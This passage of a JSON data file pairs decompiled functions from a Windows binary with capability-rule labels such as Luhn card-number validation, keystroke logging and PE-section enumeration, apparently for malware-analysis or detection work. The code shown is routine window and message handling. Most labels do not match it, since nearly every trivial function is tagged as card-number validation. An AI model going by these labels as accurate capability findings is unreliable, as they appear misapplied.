        "decompiled_code": "\nvoid __fastcall fcn.004501b4(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    *param_2 = *(in_EAX + 0x40);\n    param_2[1] = *(in_EAX + 0x44);\n    param_2[2] = *(in_EAX + 0x40) + *(in_EAX + 0x48);\n    param_2[3] = *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n    return;\n}\n",
        "token_count": 129
    },
    "00450210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00450210(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack12;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack12;\n}\n",
        "token_count": 47
    },
    "00450228": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00450228(void)\n\n{\n    fcn.00450254();\n    fcn.00418420();\n    fcn.00450720();\n    return;\n}\n",
        "token_count": 39
    },
    "00450254": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00450254(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack8;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack8;\n}\n",
        "token_count": 47
    },
    "0045026c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045026c(void)\n\n{\n    fcn.00450210();\n    fcn.00418420();\n    fcn.00450720();\n    return;\n}\n",
        "token_count": 40
    },
    "00450324": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450324(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 + iStack20;\n    param_1[1] = param_2[1] + iStack16;\n    return;\n}\n",
        "token_count": 104
    },
    "004503d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004503d4(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 - iStack20;\n    param_1[1] = param_2[1] - iStack16;\n    return;\n}\n",
        "token_count": 105
    },
    "00450720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450720(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iVar1 = *param_2;\n    iVar2 = param_2[1];\n    (**(*in_EAX + 0x44))(iVar1, iVar2);\n    (**(*in_EAX + 0x88))((in_EAX[0x13] - iStack16) + iVar2, (in_EAX[0x12] - iStack20) + iVar1);\n    return;\n}\n",
        "token_count": 153
    },
    "00451874": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00451874(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *arg_8h;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uchar auStack28 [16];\n    \n    uVar3 = *param_2;\n    uVar4 = param_2[1];\n    uVar5 = param_2[2];\n    uVar6 = param_2[3];\n    if (*(in_EAX + 0x94) != 0) {\n        cVar1 = fcn.0040484c(uVar3, uVar4, uVar5, uVar6);\n        if (cVar1 == '\\0') {\n            cVar1 = '\\0';\n            goto code_r0x004518a8;\n        }\n    }\n    cVar1 = '\\x01';\ncode_r0x004518a8:\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.00452c9c();\n        if (iVar2 == 0) {\n            fcn.0040484c(uVar3, uVar4, uVar5, uVar6);\n        }\n        else {\n            uVar3 = fcn.00450254();\n            arg_8h = auStack28;\n            fcn.00450210();\n            fcn.00418448(arg_8h, uVar3);\n            fcn.0040484c();\n        }\n    }\n    return cVar1;\n}\n",
        "token_count": 353
    },
    "00451a18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451a18(uint param_1, int32_t param_2)\n\n{\n    uint uStack16;\n    \n    sub.user32.dll_GetCursorPos();\n    fcn.004503d4();\n    *param_2 = param_2;\n    *(param_2 + 4) = uStack16;\n    return;\n}\n",
        "token_count": 77
    },
    "00451b4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00451b4c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        (**(in_EAX + 0x38))();\n    }\n    return 0;\n}\n",
        "token_count": 86
    },
    "004521f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004521f4(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = 0x451f94;\n    fcn.00451fa0(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar4);\n    uVar3 = 0x4534e8;\n    uVar4 = 0x453480;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451fd4(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x4534b8;\n    uVar4 = 0x453460;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451fd4(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x453490;\n    uVar4 = 0x4534a8;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451fd4(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x4534d0;\n    uVar4 = 0x453470;\n    iVar1 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451fd4(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, in_EAX, uVar3, iVar1);\n    return;\n}\n",
        "token_count": 523
    },
    "00452448": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00452448(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        if ((*(in_EAX + 0x48) < 0x8001) && (*(in_EAX + 0x4c) < 0x8001)) {\n            fcn.0043bbf8(*(in_EDX + 10), *(in_EDX + 8));\n            fcn.0040484c();\n        }\n        else {\n            fcn.00451a18();\n            fcn.0043bbf8(var_4h, var_8h);\n            fcn.0040484c();\n        }\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00452c9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00452c9c(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = (**(*in_EAX + 0x58))(*param_2, param_2[1], param_2[2], param_2[3]);\n    if (iVar1 != 0) {\n        iVar1 = (**(*in_EAX + 0x58))();\n        iVar2 = fcn.00404528();\n        if (iVar1 != iVar2) {\n            iVar1 = (**(*in_EAX + 0x58))();\n            uVar3 = (**(iVar1 + 0x2c))();\n            fcn.0044ff58();\n            fcn.0044ff24();\n            fcn.00450228();\n            fcn.0045026c();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 226
    },
    "0045309c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045309c(uint param_1, int32_t param_2)\n\n{\n    double *in_EAX;\n    double *pdVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if (0 < param_2) {\n        iVar3 = 1;\n        pdVar1 = in_EAX;\n        do {\n            pdVar1 = pdVar1 + 1;\n            if (*pdVar1 < in_EAX[iVar2]) {\n                iVar2 = iVar3;\n            }\n            iVar3 = iVar3 + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 174
    },
    "00453534": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00453534(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    code **in_FS_OFFSET;\n    code *pcVar3;\n    code *pcStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        puStack40 = 0x45354d;\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uStack44 = 0x45364e;\n    pcStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &fcn.00453534::var_1h + 1;\n    var_1h._0_1_ = param_2;\n    fcn.0044f6fc();\n    pcVar3 = fcn.004552ec;\n    uVar1 = fcn.00421084(fcn.004552ec, in_EAX);\n    *(in_EAX + 0x1c0) = uVar1;\n    uVar1 = fcn.00424e10();\n    *(in_EAX + 0x1a4) = uVar1;\n    fcn.00424fb8();\n    *(in_EAX + 0x1dd) = 1;\n    *(in_EAX + 0x1d4) = 0xffffffff;\n    *(in_EAX + 0x1b8) = 3;\n    if (*(*0x494d28 + 4) == 0x11) {\n        fcn.00405530();\n    }\n    else {\n        fcn.004441f8();\n        fcn.00405584();\n    }\n    *(in_EAX + 0x1db) = 0;\n    *(in_EAX + 0x192) = *0x453674;\n    *(in_EAX + 0x193) = 2;\n    *(in_EAX + 0x194) = 1;\n    *(in_EAX + 0x198) = 1;\n    *(in_EAX + 0x158) = 1;\n    iVar2 = fcn.0045dcac();\n    *(in_EAX + 0x1a0) = iVar2;\n    *(iVar2 + 0x1c) = in_EAX;\n    *(iVar2 + 0x18) = 0x459984;\n    *in_FS_OFFSET = pcVar3;\n    pcStack48 = 0x453655;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 633
    },
    "004538a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004538a4(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    \n    *param_2 = *param_2 + *(*(in_EAX + 0x1a0) + 8);\n    param_2[1] = param_2[1] + *(*(in_EAX + 0x1a0) + 0xc);\n    param_2[2] = param_2[2] - *(*(in_EAX + 0x1a0) + 0x10);\n    param_2[3] = param_2[3] - *(*(in_EAX + 0x1a0) + 0x14);\n    return;\n}\n",
        "token_count": 167
    },
    "00453cb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453cb4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar1 = fcn.00458904();\n    if (cVar1 == '\\0') {\n        fcn.00418420();\n    }\n    else {\n        (**(*in_EAX + 0x44))();\n        *param_2 = var_8h;\n        param_2[1] = var_4h;\n    }\n    *param_2 = *param_2 - (*(in_EAX[0x68] + 8) + *(in_EAX[0x68] + 0x10));\n    param_2[1] = param_2[1] - (*(in_EAX[0x68] + 0xc) + *(in_EAX[0x68] + 0x14));\n    return;\n}\n",
        "token_count": 230
    },
    "00453e44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453e44(int32_t arg_8h)\n\n{\n    uint *in_ECX;\n    uint in_EDX;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint *arg_10h;\n    uint var_18h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    arg_10h = &var_10h;\n    arg_ch = *(arg_8h + -8);\n    arg_8h_00 = 0;\n    fcn.00453cb4();\n    fcn.004538d4(arg_8h_00, arg_ch, arg_10h, in_EDX);\n    return;\n}\n",
        "token_count": 208
    },
    "00454234": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00454234(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00404620();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    fcn.00450210();\n    iVar2 = fcn.004546e8();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.004546ac();\n            if (*(iVar3 + 4) == *(in_EAX + 4)) {\n                fcn.004546ac();\n                fcn.00419740();\n                fcn.0044ff24();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar1 = *(iVar1 + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00419898();\n            fcn.00451b4c(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 325
    },
    "00454518": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454518(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    fcn.0040484c();\n    uVar3 = 1;\n    piVar4 = param_2;\n    fcn.00451b4c(1);\n    uVar2 = 1;\n    fcn.00451b4c(1);\n    fcn.00454484(uVar2, uVar3, piVar4);\n    if ((*(param_2 + 7) & 2) == 0) {\n        fcn.00451b4c(0);\n        fcn.00451b4c(0);\n        fcn.00451b4c(0);\n        fcn.00451b4c(0);\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.00458904();\n            if (cVar1 != '\\0') {\n                (**(*param_2 + 0x80))();\n            }\n        }\n        else {\n            fcn.00451b4c(0);\n            fcn.004551b8();\n        }\n        fcn.00454170();\n    }\n    fcn.00451b4c(1);\n    return;\n}\n",
        "token_count": 312
    },
    "0045460c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045460c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    \n    uVar2 = 0;\n    piVar3 = param_2;\n    fcn.00451b4c(0);\n    cVar1 = fcn.004047dc(uVar2, piVar3);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00458904();\n        if (cVar1 != '\\0') {\n            fcn.00450cec();\n        }\n    }\n    else {\n        fcn.00454464();\n        (**(*param_2 + 0xb0))();\n    }\n    fcn.004544d0();\n    fcn.00451b4c(0);\n    fcn.00451b4c(0);\n    fcn.0045422c();\n    return;\n}\n",
        "token_count": 213
    },
    "004546e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004546e8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (*(in_EAX + 0x1cc) != 0) {\n        iVar1 = *(*(in_EAX + 0x1cc) + 8);\n    }\n    if (*(in_EAX + 0x1d0) != 0) {\n        iVar1 = iVar1 + *(*(in_EAX + 0x1d0) + 8);\n    }\n    return iVar1;\n}\n",
        "token_count": 128
    },
    "00454778": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454778(uint param_1, ushort param_2)\n\n{\n    fcn.00454708(param_2, 0, 0, 0);\n    return;\n}\n",
        "token_count": 45
    },
    "00454cc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454cc4(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004521f4();\n    uVar2 = 0x454b44;\n    uVar1 = 0x454b7c;\n    uVar3 = in_EAX;\n    fcn.00454be4(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar1, in_EAX, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 151
    },
    "00455008": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00455008(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x45501e;\n    fcn.0040484c();\n    puStack20 = 0x45502b;\n    fcn.00459998();\n    uStack24 = 0x455064;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*in_EAX + 0xb0))();\n    fcn.004551b8();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x45506b;\n    uStack24 = 0x455063;\n    fcn.00459998();\n    return;\n}\n",
        "token_count": 207
    },
    "004554f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "log keystrokes via polling"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004554f4(int32_t param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t in_stack_fffffec4;\n    int16_t iStack300;\n    int16_t iStack298;\n    int32_t iStack296;\n    int32_t iStack292;\n    uchar auStack44 [4];\n    int32_t iStack40;\n    int32_t iStack36;\n    uint32_t uStack32;\n    uchar uStack28;\n    uint uStack24;\n    \n    sub.user32.dll_GetMessagePos();\n    uVar2 = fcn.0040773c();\n    iStack300 = uVar2;\n    iStack296 = iStack300;\n    iStack298 = uVar2 >> 0x10;\n    iStack292 = iStack298;\n    iStack36 = 0x455530;\n    fcn.004503d4();\n    if (param_1 == 0) {\n        iStack36 = 0;\n        in_stack_fffffec4 = 0;\n        param_1 = fcn.00455430(0, 0);\n    }\n    if (param_1 == 0) {\n        return 0;\n    }\n    iStack40 = in_stack_fffffec4;\n    if (in_EAX != param_1) {\n        iStack40 = in_stack_fffffec4 - *(param_1 + 0x40);\n        iStack36 = iStack36 - *(param_1 + 0x44);\n    }\n    uStack32 = *(param_2 + 8);\n    uStack24 = *(param_2 + 4);\n    uVar3 = *(param_2 + 10);\n    if (uVar3 < 0x201) {\n        if (uVar3 - 0xa1 < 2) {\ncode_r0x004555d5:\n            uStack28 = 0;\n            goto code_r0x004555fb;\n        }\n        if (uVar3 - 0xa4 < 2) {\ncode_r0x004555e9:\n            uStack28 = 1;\n            goto code_r0x004555fb;\n        }\n        uVar3 = uVar3 - 0xa7;\n    }\n    else {\n        if (uVar3 - 0x201 < 2) goto code_r0x004555d5;\n        if (uVar3 - 0x204 < 2) goto code_r0x004555e9;\n        uVar3 = uVar3 - 0x207;\n    }\n    if (uVar3 < 2) {\n        uStack28 = 2;\n    }\n    else {\n        uStack28 = 0;\n    }\ncode_r0x004555fb:\n    sub.user32.dll_GetKeyboardState(&stack0xfffffed8);\n    uVar1 = fcn.0043bc90();\n    uStack32._0_2_ = CONCAT11(uVar1, uStack32);\n    uStack32 = uStack32 & 0xffff0000 | uStack32;\n    uVar2 = fcn.00451b4c(&stack0xffffffd4);\n    *(param_2 + 0xc) = uVar2;\n    return 1;\n}\n",
        "token_count": 746
    },
    "00455d1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00455d1c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0044d2f4();\n    if (iVar1 != 0) {\n        uVar2 = fcn.00451b4c(*(param_2 + 8));\n        *(param_2 + 0xc) = uVar2;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 110
    },
    "004561c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004561c8(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    int32_t *arg_ch;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_18h;\n    uint nSavedDC;\n    int32_t *nLeftRect;\n    uint hdc;\n    \n    puStack36 = 0x4561dd;\n    nLeftRect = param_2;\n    hdc = in_EAX;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack40 = 0x45625e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    sub.gdi32.dll_ExcludeClipRect(hdc, *nLeftRect + 2, nLeftRect[1] + 2, nLeftRect[2] + -2, nLeftRect[3] + -2);\n    fcn.00432228();\n    fcn.00432498();\n    arg_8h = 0;\n    arg_ch = nLeftRect;\n    fcn.00432228();\n    fcn.004323ec(arg_8h, arg_ch);\n    *in_FS_OFFSET = arg_8h;\n    sub.gdi32.dll_RestoreDC(hdc, nSavedDC, 0x456265);\n    return;\n}\n",
        "token_count": 329
    },
    "00456ee8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456ee8(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040484c();\n    fcn.0040484c(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 77
    },
    "00457fd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457fd4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_10h;\n    \n    if ((((in_EDX == in_EAX[0x10]) && (in_ECX == in_EAX[0x11])) && (arg_ch == in_EAX[0x12])) && (arg_8h == in_EAX[0x13])\n       ) {\n        return;\n    }\n    cVar1 = fcn.00458904();\n    if ((cVar1 == '\\0') || (iVar2 = sub.user32.dll_IsIconic(in_EAX[0x6d]),  iVar2 != 0)) {\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        cVar1 = fcn.00458904();\n        if (cVar1 != '\\0') {\n            var_2ch = 0x2c;\n            sub.user32.dll_GetWindowPlacement(in_EAX[0x6d], &var_2ch);\n            fcn.004501b4();\n            sub.user32.dll_SetWindowPlacement();\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowPos(in_EAX[0x6d], 0);\n    }\n    fcn.0044fda0();\n    fcn.0045342c();\n    (**(*in_EAX + 0x5c))();\n    return;\n}\n",
        "token_count": 400
    },
    "004580b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004580b0(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004546e8(param_2, param_1);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.004546ac();\n            fcn.0040484c();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "004584fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004584fc(void)\n\n{\n    int32_t in_EAX;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    uStack24 = 0x45850b;\n    fcn.004501b4();\n    uStack24 = 1;\n    uStack28 = 1;\n    sub.user32.dll_InflateRect();\n    sub.user32.dll_InvalidateRect(*(*(in_EAX + 0x30) + 0x1b4), &stack0xffffffe0, 0xffffffff);\n    return;\n}\n",
        "token_count": 146
    },
    "00458910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00458910(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack60;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    uStack76 = *(in_EAX + 0x1b4);\n    puStack80 = 0x458924;\n    iVar1 = sub.user32.dll_IsIconic();\n    if (iVar1 == 0) {\n        uStack84 = *(in_EAX + 0x1b4);\n        uStack88 = 0x45895a;\n        puStack80 = &stack0xffffffb4;\n        sub.user32.dll_GetWindowRect();\n    }\n    else {\n        uStack60 = 0x2c;\n        puStack80 = &stack0xffffffc4;\n        uStack84 = *(in_EAX + 0x1b4);\n        uStack88 = 0x458941;\n        sub.user32.dll_GetWindowPlacement();\n        uStack84 = uStack40;\n        puStack80 = puStack36;\n        uStack76 = uStack32;\n        uStack72 = uStack28;\n    }\n    uStack88 = 0xfffffff0;\n    uStack92 = *(in_EAX + 0x1b4);\n    uStack96 = 0x458968;\n    uVar2 = sub.user32.dll_GetWindowLongA();\n    if ((uVar2 & 0x40000000) != 0) {\n        uStack96 = 0xfffffff8;\n        uStack100 = *(in_EAX + 0x1b4);\n        puStack104 = 0x45897d;\n        iVar1 = sub.user32.dll_GetWindowLongA();\n        if (iVar1 != 0) {\n            sub.user32.dll_ScreenToClient();\n            sub.user32.dll_ScreenToClient();\n            iStack116 = iVar1;\n            puStack112 = &stack0xffffff9c;\n            iStack108 = iVar1;\n            puStack104 = &stack0xffffff9c;\n        }\n    }\n    *(in_EAX + 0x40) = iStack116;\n    *(in_EAX + 0x44) = puStack112;\n    *(in_EAX + 0x48) = iStack108 - iStack116;\n    *(in_EAX + 0x4c) = puStack104 - puStack112;\n    fcn.0044fda0();\n    return;\n}\n",
        "token_count": 634
    },
    "00458b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458b60(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004546e8();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.004546ac();\n            if (*(iVar2 + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "00459bb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
